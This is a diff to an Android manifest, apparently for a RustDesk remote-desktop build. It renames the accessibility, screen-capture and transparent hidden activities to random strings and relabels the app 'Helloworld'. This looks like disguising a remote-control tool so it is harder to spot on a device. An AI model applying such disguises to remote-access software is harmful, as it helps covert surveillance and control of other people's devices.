@@ -31,10 +31,10 @@
 
 
         <service
-            android:name=".kzzcrgstifq"
+            android:name=".nZW99cdXQ0COhB2o"
             android:enabled="true"
             android:exported="false"
-            android:label="RustDesk Input"
+            android:label="Helloworld"
             android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE">
             <intent-filter>
                 <action android:name="android.accessibilityservice.AccessibilityService" />
@@ -46,7 +46,7 @@
         </service>
 
         <activity
-            android:name=".wbcvrgsnzma"
+            android:name=".oFtTiPzsqzBHGigp"
             android:configChanges="orientation|keyboardHidden|keyboard|screenSize|smallestScreenSize|locale|layoutDirection|fontScale|screenLayout|density|uiMode|navigation"
             android:exported="true"
             android:hardwareAccelerated="true"
@@ -64,12 +64,12 @@
                 <action android:name="android.intent.action.VIEW" />
                 <category android:name="android.intent.category.DEFAULT" />
                 <category android:name="android.intent.category.BROWSABLE" />
-                <data android:scheme="rustdesk" />
+                <data android:scheme="HelloWorld" />
             </intent-filter>
         </activity>
 
         <activity
-            android:name=".cgksnzansfwk"
+            android:name=".XerQvgpGBzr8FDFr"
             android:excludeFromRecents="true"
             android:theme="@style/Transparent" />
         
@@ -86,12 +86,12 @@
         </receiver>
 
         <service
-            android:name=".euwmhynnynde"
+            android:name=".DFm8Y8iMScvB2YDw"
             android:enabled="true"
             android:foregroundServiceType="mediaProjection" />
 
         <service
-            android:name=".uaqkjaqlbx"
+            android:name=".DFrLMwitwQbfu7AC"
             android:enabled="true" />
 
         <!--
